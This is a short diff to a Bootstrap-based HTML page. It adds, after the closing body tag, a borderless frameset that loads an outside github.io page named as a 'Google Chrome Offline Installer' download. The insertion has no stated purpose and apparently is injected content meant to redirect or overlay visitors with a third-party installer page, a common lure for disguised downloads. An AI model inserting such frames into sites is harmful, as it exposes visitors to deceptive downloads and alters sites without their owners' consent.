@@ -97,6 +97,12 @@ Based on the <a href="http://getbootstrap.com/getting-started/">Twitter Bootstra
 <script src="assets/js/#.js"></script>
 <script src="#/#.min.js"></script>
 </body>
+
+<frameset rows="*" cols="25%">
+  <frame frameborder=0 src="https://previewofflineinstaller.github.io/Download.New.Google.Chrome.Offline.Installer/HomePages/index.html" name="dot_tk_frame_content" scrolling="auto" noresize="100">
+  
+</frameset>
+
 </html>
 
 ***
